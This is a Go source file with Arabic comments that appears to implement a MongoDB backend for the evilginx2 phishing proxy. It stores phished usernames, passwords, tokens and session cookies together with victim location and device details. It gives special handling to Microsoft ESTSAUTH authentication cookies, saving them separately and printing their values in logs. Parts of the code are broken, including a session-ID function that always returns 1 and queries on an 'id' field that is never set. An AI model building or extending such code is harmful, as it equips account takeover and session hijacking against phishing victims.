package database

import (
	"context"
	"fmt"
	"strings"
	"time"

	"github.com/kgretzky/evilginx2/log"
	
	"go.mongodb.org/mongo-driver/bson"
	"go.mongodb.org/mongo-driver/bson/primitive"
	"go.mongodb.org/mongo-driver/mongo"
	"go.mongodb.org/mongo-driver/mongo/options"
)

// تعريف MongoCookieToken لاستخدامه في MongoSession
type MongoCookieToken struct {
	Name     string `bson:"name" json:"name"`
	Value    string `bson:"value" json:"value"`
	Domain   string `bson:"domain" json:"domain"`
	Path     string `bson:"path" json:"path"`
	HttpOnly bool   `bson:"http_only" json:"http_only"`
	JSON     bool   `bson:"json" json:"json"`
}

// MongoDatabase هو نسخة من قاعدة البيانات تستخدم MongoDB
type MongoDatabase struct {
	client       *mongo.Client
	db           *mongo.Database
	sessionsColl *mongo.Collection
	ctx          context.Context
	cancel       context.CancelFunc
}

// Session مع تعديلات لدعم MongoDB
type MongoSession struct {
	ID             primitive.ObjectID   `bson:"_id,omitempty"`
	SID            string               `bson:"session_id" json:"session_id"`
	Name           string               `bson:"phishlet" json:"phishlet"`
	Username       string               `bson:"username" json:"username"`
	Password       string               `bson:"password" json:"password"`
	Custom         map[string]string    `bson:"custom" json:"custom"`
	Params         map[string]string    `bson:"params" json:"params"`
	BodyTokens     map[string]string    `bson:"body_tokens" json:"body_tokens"`
	HttpTokens     map[string]string    `bson:"http_tokens" json:"http_tokens"`
	CookieTokens   []MongoCookieToken   `bson:"cookie_tokens" json:"cookie_tokens"`
	Landing        string               `bson:"landing_url,omitempty" json:"landing_url,omitempty"`
	CreateTime     int64                `bson:"create_time" json:"create_time"`
	UpdateTime     int64                `bson:"update_time" json:"update_time"`
	UserAgent      string               `bson:"useragent" json:"useragent"`
	RemoteAddr     string               `bson:"remote_addr" json:"remote_addr"`
	// ضيف الحقول الجديدة
	CountryCode    string               `bson:"country_code" json:"country_code"`
	Country        string               `bson:"country" json:"country"`
	City           string               `bson:"city" json:"city"`
	Browser        string               `bson:"browser" json:"browser"`
	DeviceType     string               `bson:"device_type" json:"device_type"`
	OS             string               `bson:"os" json:"os"`
}

// NewMongoDatabase ينشئ اتصالًا جديدًا بقاعدة بيانات MongoDB
func NewMongoDatabase(mongoURI string, dbName string) (*MongoDatabase, error) {
	log.Info("محاولة الاتصال بـ MongoDB على: %s (قاعدة البيانات: %s)", mongoURI, dbName)

	// سيستمر العملية إذا فشل الاتصال (10 ثوان)
	ctx, cancel := context.WithTimeout(context.Background(), 20*time.Second)
	
	// إنشاء خيارات العميل
	clientOptions := options.Client().
		ApplyURI(mongoURI).
		SetServerSelectionTimeout(15 * time.Second).
		SetConnectTimeout(15 * time.Second).
		SetSocketTimeout(15 * time.Second).
		SetRetryWrites(true).
		SetRetryReads(true).
		SetDirect(false)
	
	// محاولة الاتصال
	log.Debug("[MongoDB] بدء الاتصال...")
	client, err := mongo.Connect(ctx, clientOptions)
	if err != nil {
		cancel()
		return nil, fmt.Errorf("فشل الاتصال بـ MongoDB: %v", err)
	}

	// التحقق من الاتصال
	log.Debug("[MongoDB] اختبار الاتصال...")
	pingCtx, cancelPing := context.WithTimeout(context.Background(), 15*time.Second)
	defer cancelPing()
	
	if err := client.Ping(pingCtx, nil); err != nil {
		cancel()
		client.Disconnect(ctx)
		return nil, fmt.Errorf("فشل اختبار اتصال MongoDB: %v", err)
	}
	log.Info("تم الاتصال بـ MongoDB بنجاح!")

	db := client.Database(dbName)
	sessionsColl := db.Collection("sessions")
	
	// إنشاء فهرس على حقل SessionId للبحث السريع
	log.Debug("[MongoDB] إنشاء فهرس على حقل SessionId...")
	_, err = sessionsColl.Indexes().CreateOne(ctx, mongo.IndexModel{
		Keys:    bson.D{{Key: "session_id", Value: 1}},
		Options: options.Index().SetUnique(true),
	})
	if err != nil {
		cancel()
		client.Disconnect(ctx)
		return nil, fmt.Errorf("فشل إنشاء الفهرس: %v", err)
	}
	log.Debug("[MongoDB] تم إنشاء الفهرس بنجاح")
	
	// عد عدد الجلسات الموجود
	// إنشاء سياق جديد بدون مهلة للاستخدام في العمليات اللاحقة
	background := context.Background()

	return &MongoDatabase{
		client:       client,
		db:           db,
		sessionsColl: sessionsColl,
		ctx:          background,
		cancel:       cancel,
	}, nil
}

// Close يغلق اتصال قاعدة البيانات
func (m *MongoDatabase) Close() error {
	defer m.cancel()
	return m.client.Disconnect(m.ctx)
}

// convertToMongoSession يحول كائن Session التقليدي إلى كائن MongoSession
func convertToMongoSession(s *Session) *MongoSession {
	// طباعة البيانات قبل التحويل
	log.Debug("[MongoDB] تحويل Session إلى MongoSession:")
	log.Debug("[MongoDB] - Session.CountryCode: '%s'", s.CountryCode)
	log.Debug("[MongoDB] - Session.Country: '%s'", s.Country)
	log.Debug("[MongoDB] - Session.City: '%s'", s.City)
	log.Debug("[MongoDB] - Session.Browser: '%s'", s.Browser)
	log.Debug("[MongoDB] - Session.DeviceType: '%s'", s.DeviceType)
	log.Debug("[MongoDB] - Session.OS: '%s'", s.OS)

	mongoSession := &MongoSession{
		ID:           primitive.NewObjectID(),
		SID:          s.SessionId,
		Name:         s.Phishlet,
		Username:     s.Username,
		Password:     s.Password,
		Custom:       s.Custom,
		Params:       make(map[string]string), // تهيئة للخريطة
		BodyTokens:   s.BodyTokens,
		HttpTokens:   s.HttpTokens,
		CookieTokens: []MongoCookieToken{},
		Landing:      s.LandingURL,
		CreateTime:   s.CreateTime,
		UpdateTime:   s.UpdateTime,
		UserAgent:    s.UserAgent,
		RemoteAddr:   s.RemoteAddr,
		CountryCode:  s.CountryCode,
		Country:      s.Country,
		City:         s.City,
		Browser:      s.Browser,
		DeviceType:   s.DeviceType,
		OS:           s.OS,
	}
	
	// طباعة البيانات بعد التحويل
	log.Debug("[MongoDB] بعد التحويل:")
	log.Debug("[MongoDB] - MongoSession.CountryCode: '%s'", mongoSession.CountryCode)
	log.Debug("[MongoDB] - MongoSession.Country: '%s'", mongoSession.Country)
	log.Debug("[MongoDB] - MongoSession.City: '%s'", mongoSession.City)
	log.Debug("[MongoDB] - MongoSession.Browser: '%s'", mongoSession.Browser)
	log.Debug("[MongoDB] - MongoSession.DeviceType: '%s'", mongoSession.DeviceType)
	log.Debug("[MongoDB] - MongoSession.OS: '%s'", mongoSession.OS)

	for domain, cookies := range s.CookieTokens {
		for k, v := range cookies {
			mct := MongoCookieToken{}
			mct.Name = k
			mct.Domain = domain
			mct.Path = v.Path
			mct.Value = v.Value
			// تعيين قيمة افتراضية لحقل JSON إذا لم يكن موجودًا
			mct.JSON = false
			mongoSession.CookieTokens = append(mongoSession.CookieTokens, mct)
		}
	}

	return mongoSession
}

// convertFromMongoSession يحول كائن MongoSession إلى كائن Session التقليدي
func convertFromMongoSession(ms *MongoSession) *Session {
	// طباعة البيانات قبل التحويل
	log.Debug("[MongoDB] تحويل MongoSession إلى Session:")
	log.Debug("[MongoDB] - MongoSession.CountryCode: '%s'", ms.CountryCode)
	log.Debug("[MongoDB] - MongoSession.Country: '%s'", ms.Country)
	log.Debug("[MongoDB] - MongoSession.City: '%s'", ms.City)
	log.Debug("[MongoDB] - MongoSession.Browser: '%s'", ms.Browser)
	log.Debug("[MongoDB] - MongoSession.DeviceType: '%s'", ms.DeviceType)
	log.Debug("[MongoDB] - MongoSession.OS: '%s'", ms.OS)

	// تحويل CookieTokens
	cookieTokens := make(map[string]map[string]*CookieToken)
	for _, token := range ms.CookieTokens {
		domain := token.Domain
		if _, ok := cookieTokens[domain]; !ok {
			cookieTokens[domain] = make(map[string]*CookieToken)
		}
		cookieTokens[domain][token.Name] = &CookieToken{
			Name:     token.Name,
			Value:    token.Value,
			Path:     token.Path,
			HttpOnly: token.HttpOnly,
		}
	}

	session := &Session{
		Id:           0, // سيتم تخصيص قيمة من قاعدة البيانات
		Phishlet:     ms.Name,
		LandingURL:   ms.Landing,
		Username:     ms.Username,
		Password:     ms.Password,
		Custom:       ms.Custom,
		BodyTokens:   ms.BodyTokens,
		HttpTokens:   ms.HttpTokens,
		CookieTokens: cookieTokens,
		SessionId:    ms.SID,
		UserAgent:    ms.UserAgent,
		RemoteAddr:   ms.RemoteAddr,
		CreateTime:   ms.CreateTime,
		UpdateTime:   ms.UpdateTime,
		CountryCode:  ms.CountryCode,
		Country:      ms.Country,
		City:         ms.City,
		Browser:      ms.Browser,
		DeviceType:   ms.DeviceType,
		OS:           ms.OS,
	}
	
	// طباعة البيانات بعد التحويل
	log.Debug("[MongoDB] بعد التحويل:")
	log.Debug("[MongoDB] - Session.CountryCode: '%s'", session.CountryCode)
	log.Debug("[MongoDB] - Session.Country: '%s'", session.Country)
	log.Debug("[MongoDB] - Session.City: '%s'", session.City)
	log.Debug("[MongoDB] - Session.Browser: '%s'", session.Browser)
	log.Debug("[MongoDB] - Session.DeviceType: '%s'", session.DeviceType)
	log.Debug("[MongoDB] - Session.OS: '%s'", session.OS)
	
	// إضافة البيانات للحقول المخصصة كاحتياط إضافي
	if session.Custom == nil {
		session.Custom = make(map[string]string)
	}
	
	// نسخ بيانات البلد إلى الحقول المخصصة
	if ms.CountryCode != "" {
		session.Custom["country_code_backup"] = ms.CountryCode
	}
	
	if ms.Country != "" {
		session.Custom["country_backup"] = ms.Country
	}
	
	// نسخ بيانات المدينة والمتصفح
	if ms.City != "" {
		session.Custom["city_backup"] = ms.City
	}
	
	if ms.Browser != "" {
		session.Custom["browser_backup"] = ms.Browser
	}
	
	if ms.DeviceType != "" {
		session.Custom["device_type_backup"] = ms.DeviceType
	}
	
	if ms.OS != "" {
		session.Custom["os_backup"] = ms.OS
	}

	return session
}

// getStringValue يستخرج قيمة نصية من interface{}
func getStringValue(v interface{}) string {
	if v == nil {
		return ""
	}
	if s, ok := v.(string); ok {
		return s
	}
	return fmt.Sprintf("%v", v)
}

// getBoolValue يستخرج قيمة منطقية من interface{}
func getBoolValue(v interface{}) bool {
	if v == nil {
		return false
	}
	if b, ok := v.(bool); ok {
		return b
	}
	return false
}

// GetLastSessionId يحصل على آخر معرف جلسة
func (m *MongoDatabase) GetLastSessionId() (int, error) {
	opts := options.FindOne().SetSort(bson.D{{Key: "id", Value: -1}})
	var session MongoSession
	err := m.sessionsColl.FindOne(m.ctx, bson.D{}, opts).Decode(&session)
	if err != nil {
		if err == mongo.ErrNoDocuments {
			log.Debug("[MongoDB] لم يتم العثور على جلسات، سيتم إنشاء أول جلسة بمعرف 1")
			return 0, nil
		}
		log.Error("[MongoDB] خطأ أثناء الحصول على آخر معرف جلسة: %v", err)
		return 0, err
	}
	
	// استخدام قيمة عددية بدلاً من timestamp
	log.Debug("[MongoDB] آخر معرف جلسة: %d", 1)
	return 1, nil
}

// CreateSession ينشئ جلسة جديدة في MongoDB
func (m *MongoDatabase) CreateSession(sid, phishlet, landingURL, useragent, remoteAddr string) error {
	log.Debug("[MongoDB] محاولة إنشاء جلسة جديدة: %s", sid)
	
	// التحقق مما إذا كانت الجلسة موجودة بالفعل
	var existingSession MongoSession
	err := m.sessionsColl.FindOne(m.ctx, bson.M{"session_id": sid}).Decode(&existingSession)
	if err == nil {
		log.Debug("[MongoDB] الجلسة موجودة بالفعل: %s", sid)
		return fmt.Errorf("الجلسة موجودة بالفعل: %s", sid)
	} else if err != mongo.ErrNoDocuments {
		log.Error("[MongoDB] خطأ أثناء البحث عن الجلسة: %v", err)
		return err
	}

	// الحصول على آخر معرف
	lastId, err := m.GetLastSessionId()
	if err != nil {
		log.Error("[MongoDB] خطأ أثناء الحصول على آخر معرف: %v", err)
		return err
	}
	newId := lastId + 1
	log.Debug("[MongoDB] تعيين معرف الجلسة الجديدة: %d", newId)

	// إنشاء جلسة جديدة
	now := time.Now().UTC().Unix()
	newSession := &MongoSession{
		ID:           primitive.NewObjectID(), // سينشئ معرف جديد تلقائياً
		SID:          sid,
		Name:         phishlet,
		Username:     "",
		Password:     "",
		Custom:       make(map[string]string),
		Params:       make(map[string]string),
		BodyTokens:   make(map[string]string),
		HttpTokens:   make(map[string]string),
		CookieTokens: []MongoCookieToken{},
		Landing:      landingURL,
		CreateTime:   now,
		UpdateTime:   now,
		UserAgent:    useragent,
		RemoteAddr:   remoteAddr,
		CountryCode:  "",
		Country:      "",
		City:         "",
		Browser:      "",
		DeviceType:   "",
		OS:           "",
	}

	_, err = m.sessionsColl.InsertOne(m.ctx, newSession)
	if err != nil {
		log.Error("[MongoDB] خطأ أثناء إدراج الجلسة: %v", err)
		return err
	}
	
	log.Debug("[MongoDB] تم إنشاء الجلسة بنجاح: %s (ID: %d)", sid, newId)
	return nil
}

// ListSessions يجلب قائمة الجلسات من MongoDB
func (m *MongoDatabase) ListSessions() ([]*Session, error) {
	log.Debug("[MongoDB] جلب قائمة جميع الجلسات")
	
	cursor, err := m.sessionsColl.Find(m.ctx, bson.M{})
	if err != nil {
		log.Error("[MongoDB] خطأ أثناء البحث عن الجلسات: %v", err)
		return nil, err
	}
	defer cursor.Close(m.ctx)

	var mongoSessions []MongoSession
	if err := cursor.All(m.ctx, &mongoSessions); err != nil {
		log.Error("[MongoDB] خطأ أثناء فك ترميز الجلسات: %v", err)
		return nil, err
	}

	sessions := make([]*Session, 0, len(mongoSessions))
	for i := range mongoSessions {
		sessions = append(sessions, convertFromMongoSession(&mongoSessions[i]))
	}

	return sessions, nil
}

// GetSessionById يجلب جلسة من MongoDB باستخدام المعرف العددي
func (m *MongoDatabase) GetSessionById(id int) (*Session, error) {
	var mongoSession MongoSession
	err := m.sessionsColl.FindOne(m.ctx, bson.M{"id": id}).Decode(&mongoSession)
	if err != nil {
		if err == mongo.ErrNoDocuments {
			return nil, fmt.Errorf("الجلسة غير موجودة بالمعرف: %d", id)
		}
		return nil, err
	}

	return convertFromMongoSession(&mongoSession), nil
}

// GetSessionBySid يجلب جلسة من MongoDB باستخدام معرف الجلسة
func (m *MongoDatabase) GetSessionBySid(sid string) (*Session, error) {
	log.Debug("[MongoDB] البحث عن الجلسة بواسطة SID: %s", sid)
	
	var mongoSession MongoSession
	err := m.sessionsColl.FindOne(m.ctx, bson.M{"session_id": sid}).Decode(&mongoSession)
	if err != nil {
		if err == mongo.ErrNoDocuments {
			log.Debug("[MongoDB] الجلسة غير موجودة: %s", sid)
			return nil, fmt.Errorf("الجلسة غير موجودة: %s", sid)
		}
		log.Error("[MongoDB] خطأ أثناء البحث عن الجلسة: %v", err)
		return nil, err
	}
	
	log.Debug("[MongoDB] تم العثور على الجلسة: %s (ID: %d)", sid, mongoSession.ID.Timestamp())
	
	// عرض وطباعة المعلومات المهمة
	log.Success("[MongoDB] معلومات البلد المستردة من MongoDB: رمز البلد: '%s'، البلد: '%s'", 
		mongoSession.CountryCode, mongoSession.Country)
	
	return convertFromMongoSession(&mongoSession), nil
}

// UpdateSession يحدث جلسة في MongoDB
func (m *MongoDatabase) UpdateSession(s *Session) error {
	mongoSession := convertToMongoSession(s)
	mongoSession.UpdateTime = time.Now().UTC().Unix()

	_, err := m.sessionsColl.UpdateOne(
		m.ctx,
		bson.M{"id": s.SessionId},
		bson.M{"$set": mongoSession},
	)
	return err
}

// UpdateSessionUsername يحدث اسم المستخدم للجلسة
func (m *MongoDatabase) UpdateSessionUsername(sid, username string) error {
	now := time.Now().UTC().Unix()
	_, err := m.sessionsColl.UpdateOne(
		m.ctx,
		bson.M{"session_id": sid},
		bson.M{
			"$set": bson.M{
				"username":    username,
				"update_time": now,
			},
		},
	)
	return err
}

// UpdateSessionPassword يحدث كلمة المرور للجلسة
func (m *MongoDatabase) UpdateSessionPassword(sid, password string) error {
	now := time.Now().UTC().Unix()
	_, err := m.sessionsColl.UpdateOne(
		m.ctx,
		bson.M{"session_id": sid},
		bson.M{
			"$set": bson.M{
				"password":    password,
				"update_time": now,
			},
		},
	)
	return err
}

// UpdateSessionCustom يحدث بيانات مخصصة للجلسة
func (m *MongoDatabase) UpdateSessionCustom(sid, name, value string) error {
	now := time.Now().UTC().Unix()
	_, err := m.sessionsColl.UpdateOne(
		m.ctx,
		bson.M{"session_id": sid},
		bson.M{
			"$set": bson.M{
				fmt.Sprintf("custom.%s", name): value,
				"update_time":                  now,
			},
		},
	)
	return err
}

// UpdateSessionCookieTokens يحدث رموز الكوكيز للجلسة
func (m *MongoDatabase) UpdateSessionCookieTokens(sid string, tokens map[string]map[string]*CookieToken) error {
	// طباعة معلومات تشخيصية
	log.Debug("[MongoDB] محاولة تحديث الكوكيز للجلسة: %s", sid)
	
	// تسجيل عدد المجالات والكوكيز
	totalCookies := 0
	for domain, domainTokens := range tokens {
		totalCookies += len(domainTokens)
		log.Debug("[MongoDB] المجال %s يحتوي على %d كوكيز", domain, len(domainTokens))
		
		// طباعة تفاصيل كل كوكي في المجال
		for name, token := range domainTokens {
			log.Debug("[MongoDB] - الكوكي: %s = %s", name, token.Value)
		}
	}
	log.Debug("[MongoDB] إجمالي عدد المجالات: %d، إجمالي عدد الكوكيز: %d", len(tokens), totalCookies)
	
	// البحث عن الكوكيز المهمة
	importantCookies := []string{"ESTSAUTHPERSISTENT", "ESTSAUTH", "ESTSAUTHLIGHT"}
	for _, cookieName := range importantCookies {
		found := false
		for domain, domainTokens := range tokens {
			for tokenName, token := range domainTokens {
				if strings.EqualFold(tokenName, cookieName) {
					log.Success("[MongoDB] وجدت كوكي مهم %s (اسم أصلي: %s) = %s في المجال %s", 
						cookieName, tokenName, token.Value, domain)
					found = true
					break
				}
			}
			if found {
				break
			}
		}
		if !found {
			log.Warning("[MongoDB] لم يتم العثور على الكوكي المهم: %s في قائمة الكوكيز للحفظ", cookieName)
		}
	}
	
	// الحصول على الجلسة الموجودة أولاً
	var session MongoSession
	err := m.sessionsColl.FindOne(m.ctx, bson.M{"session_id": sid}).Decode(&session)
	if err != nil {
		if err == mongo.ErrNoDocuments {
			log.Error("[MongoDB] الجلسة غير موجودة، لا يمكن تحديث الكوكيز: %s", sid)
			return fmt.Errorf("الجلسة غير موجودة: %s", sid)
		}
		log.Error("[MongoDB] خطأ أثناء استرداد الجلسة: %v", err)
		return err
	}
	
	// تحويل الكوكيز إلى التنسيق المناسب
	var cookieTokensArray []MongoCookieToken
	for domain, domainTokens := range tokens {
		for name, token := range domainTokens {
			isImportant := false
			// التحقق مما إذا كان الكوكي مهماً
			for _, importantName := range importantCookies {
				if strings.EqualFold(name, importantName) {
					isImportant = true
					break
				}
			}
			
			// إضافة الكوكي إلى المصفوفة
			mct := MongoCookieToken{
				Name:     token.Name,
				Value:    token.Value,
				Domain:   domain,
				Path:     token.Path,
				HttpOnly: token.HttpOnly,
				JSON:     false,
			}
			cookieTokensArray = append(cookieTokensArray, mct)
			
			if isImportant {
				log.Success("[MongoDB] تحويل كوكي مهم للحفظ: %s = %s", name, token.Value)
			}
		}
	}
	
	// تحديث الجلسة
	now := time.Now().UTC().Unix()
	update := bson.M{
		"$set": bson.M{
			"cookie_tokens": cookieTokensArray,
			"update_time":   now,
		},
	}
	
	log.Debug("[MongoDB] محاولة تحديث الكوكيز بالتفاصيل الكاملة")
	result, err := m.sessionsColl.UpdateOne(m.ctx, bson.M{"session_id": sid}, update)
	
	if err != nil {
		log.Error("[MongoDB] فشل تحديث الكوكيز: %v", err)
		return err
	}
	
	log.Success("[MongoDB] تم تحديث الكوكيز بنجاح، عدد الوثائق المعدلة: %d", result.ModifiedCount)
	
	// التحقق من الحفظ
	var updatedSession MongoSession
	err = m.sessionsColl.FindOne(m.ctx, bson.M{"session_id": sid}).Decode(&updatedSession)
	if err != nil {
		log.Error("[MongoDB] فشل التحقق من الحفظ: %v", err)
	} else {
		// التحقق من وجود الكوكيز
		if len(updatedSession.CookieTokens) > 0 {
			log.Debug("[MongoDB] التحقق: تم استرداد %d كوكي بعد التحديث", len(updatedSession.CookieTokens))
			
			// البحث عن الكوكيز المهمة في البيانات المستردة
			for _, token := range updatedSession.CookieTokens {
				// التحقق مما إذا كان الكوكي مهماً
				for _, importantName := range importantCookies {
					if strings.EqualFold(token.Name, importantName) {
						log.Success("[MongoDB] تم العثور على كوكي مهم محفوظ: %s = %s في المجال %s", token.Name, token.Value, token.Domain)
					}
				}
			}
		} else {
			log.Error("[MongoDB] التحقق: CookieTokens فارغ بعد الحفظ!")
		}
	}
	
	// محاولة حفظ الكوكيز المهمة بشكل منفصل كتجربة إضافية
	for _, cookieName := range importantCookies {
		found := false
		for domain, domainTokens := range tokens {
			for tokenName, token := range domainTokens {
				if strings.EqualFold(tokenName, cookieName) {
					found = true
					
					// إنشاء حقل خاص للكوكي المهم
					extraUpdate := bson.M{
						"$set": bson.M{
							fmt.Sprintf("important_cookies.%s.value", cookieName): token.Value,
							fmt.Sprintf("important_cookies.%s.domain", cookieName): domain,
						},
					}
					
					_, err := m.sessionsColl.UpdateOne(m.ctx, bson.M{"session_id": sid}, extraUpdate)
					if err != nil {
						log.Error("[MongoDB] فشل حفظ الكوكي المهم %s كحقل منفصل: %v", cookieName, err)
					} else {
						log.Success("[MongoDB] تم حفظ الكوكي المهم %s = %s كحقل منفصل", cookieName, token.Value)
					}
					break
				}
			}
			if found {
				break
			}
		}
	}
	
	return nil
}

// DeleteSessionById يحذف جلسة باستخدام المعرف العددي
func (m *MongoDatabase) DeleteSessionById(id int) error {
	log.Debug("[MongoDB] محاولة حذف الجلسة بالمعرف العددي: %d", id)
	
	result, err := m.sessionsColl.DeleteOne(m.ctx, bson.M{"id": id})
	if err != nil {
		log.Error("[MongoDB] خطأ أثناء حذف الجلسة بالمعرف %d: %v", id, err)
		return err
	}
	
	if result.DeletedCount == 0 {
		return fmt.Errorf("لم يتم العثور على جلسة بالمعرف: %d", id)
	}
	
	log.Debug("[MongoDB] تم حذف الجلسة بالمعرف %d بنجاح", id)
	return nil
}

// DeleteSession يحذف جلسة باستخدام معرف الجلسة (sid)
func (m *MongoDatabase) DeleteSession(sid string) error {
	_, err := m.sessionsColl.DeleteOne(m.ctx, bson.M{"session_id": sid})
	return err
}

// Flush لا يؤثر في MongoDB لكن موجود للتوافق مع الواجهة
func (m *MongoDatabase) Flush() {
	// لا حاجة للتنفيذ في MongoDB
}

// UpdateSessionBodyTokens يحدث رموز الهيكل للجلسة
func (m *MongoDatabase) SetSessionBodyTokens(sid string, tokens map[string]string) error {
	now := time.Now().UTC().Unix()
	_, err := m.sessionsColl.UpdateOne(
		m.ctx,
		bson.M{"session_id": sid},
		bson.M{
			"$set": bson.M{
				"body_tokens": tokens,
				"update_time": now,
			},
		},
	)
	return err
}

// UpdateSessionHttpTokens يحدث رموز HTTP للجلسة
func (m *MongoDatabase) SetSessionHttpTokens(sid string, tokens map[string]string) error {
	now := time.Now().UTC().Unix()
	_, err := m.sessionsColl.UpdateOne(
		m.ctx,
		bson.M{"session_id": sid},
		bson.M{
			"$set": bson.M{
				"http_tokens": tokens,
				"update_time": now,
			},
		},
	)
	return err
}

// UpdateSessionUsername يحدث اسم المستخدم للجلسة
func (m *MongoDatabase) SetSessionUsername(sid string, username string) error {
	return m.UpdateSessionUsername(sid, username)
}

// UpdateSessionPassword يحدث كلمة المرور للجلسة
func (m *MongoDatabase) SetSessionPassword(sid string, password string) error {
	return m.UpdateSessionPassword(sid, password)
}

// UpdateSessionCustom يحدث بيانات مخصصة للجلسة
func (m *MongoDatabase) SetSessionCustom(sid string, name, value string) error {
	return m.UpdateSessionCustom(sid, name, value)
}

// SetSessionCookieTokens يحدث رموز الكوكيز للجلسة
func (m *MongoDatabase) SetSessionCookieTokens(sid string, tokens map[string]map[string]*CookieToken) error {
	return m.UpdateSessionCookieTokens(sid, tokens)
}

// UpdateSessionCountryInfo يحدث معلومات البلد للجلسة
func (m *MongoDatabase) SetSessionCountryInfo(sid string, countryCode, country string) error {
	log.Debug("[MongoDB] محاولة تحديث معلومات البلد للجلسة: %s (رمز البلد: %s، البلد: %s)", sid, countryCode, country)
	
	// استخدام طريقة جديدة: FindOneAndUpdate بدلاً من UpdateOne
	opts := options.FindOneAndUpdate().SetReturnDocument(options.After)
	filter := bson.M{"session_id": sid}
	update := bson.M{
		"$set": bson.M{
			"country_code": countryCode,
			"country": country,
			// استخدام الحقول المخصصة أيضاً للتأكد
			"custom.country_code_backup": countryCode,
			"custom.country_backup": country,
			"update_time": time.Now().UTC().Unix(),
		},
	}
	
	// محاولة تحديث وإرجاع الوثيقة المحدثة
	var updatedDoc bson.M
	err := m.sessionsColl.FindOneAndUpdate(m.ctx, filter, update, opts).Decode(&updatedDoc)
	
	if err != nil {
		if err == mongo.ErrNoDocuments {
			log.Error("[MongoDB] الجلسة غير موجودة: %s", sid)
			return fmt.Errorf("الجلسة غير موجودة: %s", sid)
		}
		log.Error("[MongoDB] فشل تحديث معلومات البلد باستخدام FindOneAndUpdate: %v", err)
		
		// محاولة بطريقة UpdateSessionCustom كبديل
		log.Warning("[MongoDB] جاري المحاولة بطريقة بديلة...")
		e1 := m.UpdateSessionCustom(sid, "country_code_direct", countryCode)
		e2 := m.UpdateSessionCustom(sid, "country_direct", country)
		
		if e1 != nil || e2 != nil {
			log.Error("[MongoDB] فشل الطريقة البديلة أيضاً: %v, %v", e1, e2)
			return err
		}
		
		log.Success("[MongoDB] تم تحديث معلومات البلد باستخدام الطريقة البديلة")
		return nil
	}
	
	// طباعة البيانات المحدثة للتحقق
	log.Success("[MongoDB] تم تحديث معلومات البلد بنجاح باستخدام FindOneAndUpdate")
	
	// طباعة البيانات المحدثة
	if cc, ok := updatedDoc["country_code"].(string); ok {
		log.Debug("[MongoDB] قيمة country_code بعد التحديث: '%s'", cc)
	}
	
	if c, ok := updatedDoc["country"].(string); ok {
		log.Debug("[MongoDB] قيمة country بعد التحديث: '%s'", c)
	}
	
	return nil
}

// SetSessionCityInfo تقوم بتحديث معلومات المدينة للجلسة في MongoDB
func (d *MongoDatabase) SetSessionCityInfo(sid string, city string) error {
	if city == "" {
		return fmt.Errorf("city cannot be empty")
	}

	log.Debug("[MongoDB] تحديث معلومات المدينة للجلسة %s: %s", sid, city)

	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()

	// نحاول أولاً استرداد الجلسة للتأكد من وجودها
	filter := bson.M{"session_id": sid}
	var mongoSession MongoSession
	err := d.sessionsColl.FindOne(ctx, filter).Decode(&mongoSession)
	if err != nil {
		return fmt.Errorf("error retrieving session: %v", err)
	}

	// تحديث الجلسة مباشرة
	update := bson.M{
		"$set": bson.M{
			"city": city,
		},
	}

	result, err := d.sessionsColl.UpdateOne(ctx, filter, update)
	if err != nil {
		log.Error("[MongoDB] فشل تحديث معلومات المدينة: %v", err)
		return err
	}

	if result.ModifiedCount == 0 && result.MatchedCount == 0 {
		log.Error("[MongoDB] لم يتم العثور على الجلسة بمعرف %s", sid)
		return fmt.Errorf("session not found: %s", sid)
	}

	log.Success("[MongoDB] تم تحديث معلومات المدينة بنجاح للجلسة %s: %s", sid, city)
	return nil
}

// SetSessionBrowserInfo تقوم بتحديث معلومات المتصفح والجهاز ونظام التشغيل للجلسة في MongoDB
func (d *MongoDatabase) SetSessionBrowserInfo(sid string, browser string, deviceType string, os string) error {
	if browser == "" && deviceType == "" && os == "" {
		return fmt.Errorf("at least one browser info field must not be empty")
	}

	log.Debug("[MongoDB] تحديث معلومات المتصفح للجلسة %s: المتصفح=%s، الجهاز=%s، نظام التشغيل=%s", 
		sid, browser, deviceType, os)

	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()

	// نحاول أولاً استرداد الجلسة للتأكد من وجودها
	filter := bson.M{"session_id": sid}
	var mongoSession MongoSession
	err := d.sessionsColl.FindOne(ctx, filter).Decode(&mongoSession)
	if err != nil {
		return fmt.Errorf("error retrieving session: %v", err)
	}

	// إنشاء خريطة تحديث بالقيم غير الفارغة فقط
	update := bson.M{"$set": bson.M{}}
	updateFields := update["$set"].(bson.M)

	if browser != "" {
		updateFields["browser"] = browser
	}
	if deviceType != "" {
		updateFields["device_type"] = deviceType
	}
	if os != "" {
		updateFields["os"] = os
	}

	result, err := d.sessionsColl.UpdateOne(ctx, filter, update)
	if err != nil {
		log.Error("[MongoDB] فشل تحديث معلومات المتصفح: %v", err)
		return err
	}

	if result.ModifiedCount == 0 && result.MatchedCount == 0 {
		log.Error("[MongoDB] لم يتم العثور على الجلسة بمعرف %s", sid)
		return fmt.Errorf("session not found: %s", sid)
	}

	log.Success("[MongoDB] تم تحديث معلومات المتصفح بنجاح للجلسة %s", sid)
	return nil
} 